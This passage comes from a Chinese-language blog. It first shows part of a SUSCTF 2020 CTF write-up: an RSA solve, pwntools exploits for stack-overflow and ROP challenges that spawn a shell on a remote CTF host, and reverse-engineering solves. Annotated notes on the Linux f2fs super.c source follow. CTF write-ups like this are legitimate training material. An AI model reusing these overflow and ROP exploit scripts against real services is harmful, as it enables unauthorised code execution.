class="number">10807879892068351137882646909051489249635133849135554246405938629884200521475944531591568601618793402948721935425608627699981096326141738901035519331102707539920513581542001947790197240207566927971678513209908723244407016045630599048822569018427598397968961619045802981482548829222463503036924385721648266628299260991104729336073926580607199543174083380805549563817814412425939068641770601855910658492094090168370370854773061021846017875357170911444961167591295893582538961911101048500175084293595051999904087614747835111979609341806717723922618200228638905661136101116560894773115822777483505620089698306929561785323</span></span><br><span class="line">c2 = <span class="number">9683205078328252218032269702345643329971829786690479639266538047554486626818807182948959694083494415321749771694962705383395520313360833790060850924741844334210061457412714409510396570202504721712360741707661477563359914632426508418800225158732852097973890339230747236123801365622331935944566042700904386015421937836728697959613396426201564885786343062950855931133983926321168463148165960442802306229736368651402634294933332130289754301101314108768581240883792427050189942403534268596623333863094794374201347799653298070303061655891582667320043298218647231196611752237350024535657749266580570143793917557001539320495</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pollard_p_1</span>(<span class="params">N</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = a</span><br><span class="line">        <span class="comment"># precompute</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80000</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80000</span>, <span class="number">104729</span> + <span class="number">1</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">            <span class="keyword">if</span> n % <span class="number">15</span> == <span class="number">0</span>:</span><br><span class="line">                d = GCD(f - <span class="number">1</span>, N)</span><br><span class="line">                <span class="keyword">if</span> <span class="number">1</span> &lt; d &lt; N:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(Pollard_p_1(n1))</span></span><br><span class="line">p1 = <span class="number">23975730849019524224501133179102224796674075610246254128092570426422042826827752011251742168145817735504529147185472555701614948560936966981378192239399032009466320988235920811175788786979445565393611983841562134713850961292348331543316941450790337102298329241467860332089091772440405878425341499542277671695443</span></span><br><span class="line">q1 = n1 // p1</span><br><span class="line">d1 = invert(e1, (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(d1)</span></span><br><span class="line"><span class="comment"># d1 = 1290874390686504113800572548905624374916776782724975256433059733649402123331783485100866839214765709327051490890533906164789637167756002530899939477455484690947244496257304479081591111430374674711210201941039895188105776196200300051585789328908847443600121450707473374776889986080083458396462547926445074654616956992228117873470173124680591450377597400447728593106359737986839543880607109412876695735287787219432558567338918079968635213970201053049858159596886411010563653463432345037560562367605341086450175287814510703091118683130796239718226908370016179998972192219601416531060637529519864036298222311171029394100081</span></span><br><span class="line"></span><br><span class="line">hint = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="comment"># print(hint)</span></span><br><span class="line"><span class="comment"># hint = 6447619334753222352642437426429858393559157103132369271461053517398729066459898239876515174356275892746233257614418880902563829997140350674866683206108482180467602522894155668424194920123827480635464864103765289832500322877007095569898442461637065138702513583894277315133366039750740029708723131396176433739505095125300759881683959288494017209369857877787318788348783910350463678400192419123716822673269223216260659356722683659879902069300190507155060239407696896030102443235801007815882499003540957722284061124180164977533909072687907196264536660791464489256384351443110635373913931349991593387041785791002589247321</span></span><br><span class="line"></span><br><span class="line">d2 = hack_RSA(hint, n2)</span><br><span class="line"><span class="comment"># print(d2)</span></span><br><span class="line">d2 = <span class="number">233</span></span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><code>SUSCTF&#123;Sm0oTh_PQ_&amp;_Sma11_d&#125;</code></p>
<h4 id="Pwn-babync"><a href="#Pwn-babync" class="headerlink" title="[Pwn]babync"></a>[Pwn]babync</h4><h5 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>Ubuntn中<code>nc 146.56.223.95 20002</code>  </li>
<li><code>ls</code>然后<code>cat flag</code>即可</li>
</ol>
<h4 id="Pwn-babystack"><a href="#Pwn-babystack" class="headerlink" title="[Pwn]babystack"></a>[Pwn]babystack</h4><h5 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babystack</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Full RELRO  </span><br><span class="line">    Stack:    Canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></li>
<li><p>IDA64打开，<code>main()</code>有  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello,I&#x27;m 1p0ch.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>) )</span><br><span class="line">    backdoor(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>所以，只要<code>s1=&quot;btis_wants_girlfriends&quot;</code>即可，查看栈信息<br><img src="/2020/10/20/SUS2020/babystackbuf.png"><br>只要填充<code>&#39;a&#39;*0x30</code>即可覆盖到s1，因此有exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20006</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">&quot;btis_wants_girlfriends&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="Pwn-babyrop"><a href="#Pwn-babyrop" class="headerlink" title="[Pwn]babyrop"></a>[Pwn]babyrop</h4><h5 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babyrop</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000) </span><br></pre></td></tr></table></figure></li>
<li><p>IDA64打开，直接F5，<code>main()</code>  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy rop&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>read存在栈溢出漏洞，填入0x68个’a’就可达返回地址，但是broken_backdoor只能<code>ls</code>，并不是我们想要的，所以需要构造ROP<br><a href="https://blog.csdn.net/michaelinfinity/article/details/88584349">类似题目</a>  </p>
</li>
<li><p>可通过IDA直接SHIFT+F12找到<code>/bin/sh</code>地址为0x601050<br><img src="/2020/10/20/SUS2020/babyropbin.png">  </p>
</li>
<li><p>函数窗口查看<code>_system()</code>地址0x400540<br><img src="/2020/10/20/SUS2020/babyropsys.png">  </p>
</li>
<li><p>因为传入一个参数，所以需要知道rdi地址，利用<code>ROPgadget --binary babyrop --only &#39;pop|ret&#39; | grep rdi</code>可得0x400763，所以先覆盖’a’再填入rdi再放binsh再加system即可执行  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20007</span>)</span><br><span class="line">rdi = <span class="number">0x400763</span></span><br><span class="line">binsh = <span class="number">0x601050</span></span><br><span class="line">sys_addr = <span class="number">0x400540</span></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><code>SUSCTF&#123;29b76a5fedeb34b78d4284e896ced52f&#125;</code></p>
<h4 id="Pwn-babydoor"><a href="#Pwn-babydoor" class="headerlink" title="[Pwn]babydoor"></a>[Pwn]babydoor</h4><h5 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babydoor</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000)  </span><br></pre></td></tr></table></figure></li>
<li><p>IDA64打开，F5，找到<code>main()</code>  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy ret2text&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>read存在栈溢出漏洞，传入<code>&#39;a&#39;*0x68</code>即可到达返回地址，exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20008</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span> + p64(<span class="number">0x400676</span>) + p64(<span class="number">0x4006fb</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="Pwn-snake"><a href="#Pwn-snake" class="headerlink" title="[Pwn]snake"></a>[Pwn]snake</h4><h5 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>ssh连上，<code>./snake</code>，然后就硬玩<br><img src="/2020/10/20/SUS2020/snake.png"></li>
</ol>
<h4 id="Reverse-迷宫"><a href="#Reverse-迷宫" class="headerlink" title="[Reverse]迷宫"></a>[Reverse]迷宫</h4><h5 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>在IDA中反编译后找到<br><img src="/2020/10/20/SUS2020/maze.png">  </li>
<li>猜测是个迷宫矩阵，故按8x8排列得到<br><img src="/2020/10/20/SUS2020/modimaze.png">  </li>
<li>所以出迷宫的方法是：LLLDDRDRRDDLLLD  </li>
<li><code>./babymaze</code>然后输入以上字符串得结果<br><code>SUSCTF&#123;DLLLDDRRDRDDLLLLLLDDRDRRDDLLLD&#125;</code>  </li>
</ol>
<h4 id="Reverse-表面"><a href="#Reverse-表面" class="headerlink" title="[Reverse]表面"></a>[Reverse]表面</h4><h5 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>用IDA打开，在<code>main()</code>中注意到有一个wrongans很可疑，查看一下，在其相邻的地方有<br><img src="/2020/10/20/SUS2020/rawBanner.png">  </li>
<li>这就很有意思了，太像一个Banner了，其中还有0x0AH的格式，猜想是需要重新调整格式得到想要的flag，用文本编辑器调一下即可，得到<br><img src="/2020/10/20/SUS2020/babysigninBanner.png">  </li>
<li>调整一下宽高明显点<br><img src="/2020/10/20/SUS2020/newBabysigninBanner.png"><br>所见即所得<br><code>SUS&#123;all_the_alphabets&#125;</code>  </li>
</ol>
<h4 id="Reverse-静置"><a href="#Reverse-静置" class="headerlink" title="[Reverse]静置"></a>[Reverse]静置</h4><h5 id="解题思路-20"><a href="#解题思路-20" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>拖到IDA反编译，SHIFT+F12查看字符串<br><img src="/2020/10/20/SUS2020/babyre.png">  </li>
<li>查看mov<br><img src="/2020/10/20/SUS2020/babyremov.png">  </li>
<li>16进制转ASCII即可  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>,</span><br><span class="line">       <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x5F</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x5F</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x23</span>, <span class="number">0x7D</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><code>SUSCTF&#123;W3lcome_to_SUSCTF_2020_RE#&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>linux_f2fs_super_cp_recv</title>
    <url>/2020/02/29/linux-f2fs-super-cp-recv/</url>
    <content><![CDATA[<h1 id="Linux-v3-8-rc1"><a href="#Linux-v3-8-rc1" class="headerlink" title="Linux v3.8-rc1"></a>Linux v3.8-rc1</h1><h2 id="super-c"><a href="#super-c" class="headerlink" title="super.c"></a>super.c</h2><h3 id="f2fs-alloc-inode-从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs-inode"><a href="#f2fs-alloc-inode-从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs-inode" class="headerlink" title="f2fs_alloc_inode // 从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs_inode"></a>f2fs_alloc_inode // 从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs_inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* struct inode 和 struct super_block 在/include/linux/fs.h中*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode *<span class="title">f2fs_alloc_inode</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_inode_info</span> *<span class="title">fi</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用kmem_cache_alloc从缓存中申请内存。</span></span><br><span class="line"><span class="comment">     * f2fs_inode_cachep是可以指向任意kmem_cache类型的结构体指针</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 内存分配掩码Get Free Page Mask</span></span><br><span class="line"><span class="comment">     * GFP_NOFS：分配内存时，禁止任何文件系统操作</span></span><br><span class="line"><span class="comment">     * __GFP_ZERO：分配器在分配成功时，将返回填充字节0的页</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    fi = kmem_cache_alloc(f2fs_inode_cachep, GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (!fi)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    init_once((<span class="keyword">void</span> *) fi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initilize f2fs-specific inode info */</span></span><br><span class="line">    fi-&gt;vfs_inode.i_version = <span class="number">1</span>;</span><br><span class="line">    atomic_set(&amp;fi-&gt;dirty_dents, <span class="number">0</span>);</span><br><span class="line">    fi-&gt;current_depth = <span class="number">1</span>;</span><br><span class="line">    fi-&gt;is_cold = <span class="number">0</span>;</span><br><span class="line">    rwlock_init(&amp;fi-&gt;ext.ext_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设定索引节点的标志（FI_NEW_INODE为枚举类型，表明新分配的索引节点）</span></span><br><span class="line">    set_inode_flag(fi, FI_NEW_INODE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;fi-&gt;vfs_inode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="f2fs-i-callback-进程结束后把进程信息存放到缓存中"><a href="#f2fs-i-callback-进程结束后把进程信息存放到缓存中" class="headerlink" title="f2fs_i_callback // 进程结束后把进程信息存放到缓存中"></a>f2fs_i_callback // 进程结束后把进程信息存放到缓存中</h3><p>调用<code>container_of</code>(macro在include/linux/kernel.h中)使指针head指向inode结构体的成员变量i_rcu, 把整个inode结构体的指针都存放在<code>struct inode *inode</code>，再调用<code>F2FS_I</code>函数通过inode指针指向f2fs_inode_info中的成员vfs_inode，通过inode指针返回结构体f2fs_inode_info的起始地址。然后调用<code>kmem_cache_free</code>函数把前面返回的结构体地址保存到f2fs_inode_cachep。</p>
<h3 id="f2fs-destroy-inode-销毁旧的inode指针"><a href="#f2fs-destroy-inode-销毁旧的inode指针" class="headerlink" title="f2fs_destroy_inode // 销毁旧的inode指针"></a>f2fs_destroy_inode // 销毁旧的inode指针</h3><h3 id="f2fs-put-super-释放内存"><a href="#f2fs-put-super-释放内存" class="headerlink" title="f2fs_put_super // 释放内存"></a>f2fs_put_super // 释放内存</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f2fs_put_super</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * F2FS_SB in /fs/f2fs/f2fs.h</span></span><br><span class="line"><span class="comment">     * 把sb指向结构体super_block的子数据s_fs_info指针并将其赋给sbi</span></span><br><span class="line"><span class="comment">     * s_fs_info指向特定文件系统的超级块信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_sb_info</span> *<span class="title">sbi</span> =</span> F2FS_SB(sb);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_F2FS_STAT_FS <span class="comment">// 如果宏已经定义，则编译下面代码</span></span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;s_proc) &#123;</span><br><span class="line">        f2fs_stat_exit(sbi);</span><br><span class="line">        remove_proc_entry(sb-&gt;s_id, f2fs_proc_root);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    stop_gc_thread(sbi); <span class="comment">// 停止gc线程</span></span><br><span class="line"></span><br><span class="line">    write_checkpoint(sbi, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    iput(sbi-&gt;node_inode); <span class="comment">// 如果索引节点使用计数达到零，则索引节点将被释放或销毁</span></span><br><span class="line">    iput(sbi-&gt;meta_inode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* destroy f2fs internal modules */</span></span><br><span class="line">    destroy_gc_manager(sbi);</span><br><span class="line">    destroy_node_manager(sbi);</span><br><span class="line">    destroy_segment_manager(sbi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kfree释放先前分配的内存</span></span><br><span class="line"><span class="comment">     * sbi-&gt;ckpt：kmalloc返回的指针。 如果sbi-&gt;ckpt为NULL，则不执行任何操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    kfree(sbi-&gt;ckpt);</span><br><span class="line"></span><br><span class="line">    sb-&gt;s_fs_info = <span class="literal">NULL</span>;</span><br><span class="line">    brelse(sbi-&gt;raw_super_buf);</span><br><span class="line">    kfree(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="f2fs-statfs-获取f2fs使用情况"><a href="#f2fs-statfs-获取f2fs使用情况" class="headerlink" title="f2fs_statfs // 获取f2fs使用情况"></a>f2fs_statfs // 获取f2fs使用情况</h3><p>如block大小和数目。可使用的有效block数目，有效的inode数目，有效的node数目</p>
<h3 id="f2fs-show-options-属性显示"><a href="#f2fs-show-options-属性显示" class="headerlink" title="f2fs_show_options // 属性显示"></a>f2fs_show_options // 属性显示</h3><p>如有操作，如“后台清理”、“关闭前滚”、“无堆分配”等情况出现，向seq流中写入相应的字符串如”,background_gc_on”</p>
<h3 id="parse-options-解析属性，与f2fs-show-options关联，认为两者与项目无关"><a href="#parse-options-解析属性，与f2fs-show-options关联，认为两者与项目无关" class="headerlink" title="parse_options // 解析属性，与f2fs_show_options关联，认为两者与项目无关"></a>parse_options // 解析属性，与f2fs_show_options关联，认为两者与项目无关</h3><h3 id="max-file-size-通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小"><a href="#max-file-size-通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小" class="headerlink" title="max_file_size // 通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小"></a>max_file_size // 通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小</h3><h3 id="sanity-check-raw-super-原始super的健全性检查"><a href="#sanity-check-raw-super-原始super的健全性检查" class="headerlink" title="sanity_check_raw_super // 原始super的健全性检查"></a>sanity_check_raw_super // 原始super的健全性检查</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sanity_check_raw_super</span><span class="params">(struct f2fs_super_block *raw_super)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> blocksize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查魔数magic是否为F2FS_SUPER_MAGIC</span></span><br><span class="line">    <span class="keyword">if</span> (F2FS_SUPER_MAGIC != le32_to_cpu(raw_super-&gt;magic))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    blocksize = <span class="number">1</span> &lt;&lt; le32_to_cpu(raw_super-&gt;log_blocksize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 检查块大小和页大小是否一致（f2fs文件系统的设计上是一致的）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (blocksize != PAGE_CACHE_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sanity-check-ckpt-checkpoint的健全性检查"><a href="#sanity-check-ckpt-checkpoint的健全性检查" class="headerlink" title="sanity_check_ckpt // checkpoint的健全性检查"></a>sanity_check_ckpt // checkpoint的健全性检查</h3><p>如果ckpt, sit, nat, ssa各自的segment数之和加上gc的保留段数 小于等于 segment总数，则通过健全性检查</p>
<h3 id="init-sb-info-对f2fs-sb-info进行初始化"><a href="#init-sb-info-对f2fs-sb-info进行初始化" class="headerlink" title="init_sb_info // 对f2fs_sb_info进行初始化"></a>init_sb_info // 对f2fs_sb_info进行初始化</h3><h3 id="f2fs-fill-super-读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化"><a href="#f2fs-fill-super-读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化" class="headerlink" title="f2fs_fill_super // 读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化"></a>f2fs_fill_super // 读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化</h3><p><code>f2fs_fill_super</code> 是加载F2FS文件系统的第一步，主要<strong>作用</strong>是读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化。  </p>
<blockquote>
<p>1 首先调用<code>kzalloc</code>为特定f2fs的超级块信息分配内存<br>2 设定一个临时的块大小<br>3 调用<code>sb_bread</code>读取原始超级块的信息<br>4 调用<code>set_opt</code>初始化FS参数<br>5 调用<code>parse_options</code>解析安装属性<br>6 对原始super进行健全性检查<br>7 初始化特定的超级块信息，如用于gc, cp, write_inode, writepages的互斥量<br>8 调用<code>f2fs_iget</code>获取元空间的索引节点<br>9 对cp做健全性检查<br>10 调用<code>init_orphan_info</code>初始化超级块orphan信息<br>11 依次调用<code>build_segment_manager</code>, <code>build_node_manager</code>, <code>build_gc_manager</code>设置f2fs内部模块<br>12 调用<code>recover_orphan_inodes</code>恢复孤立节点，有则释放它们<br>13 调用<code>f2fs_iget</code>获取根索引节点和目录项<br>14 调用<code>recover_fsync_data</code>恢复（与数据的同步写入磁盘相关）<br>15 运行后台GC线程</p>
</blockquote>
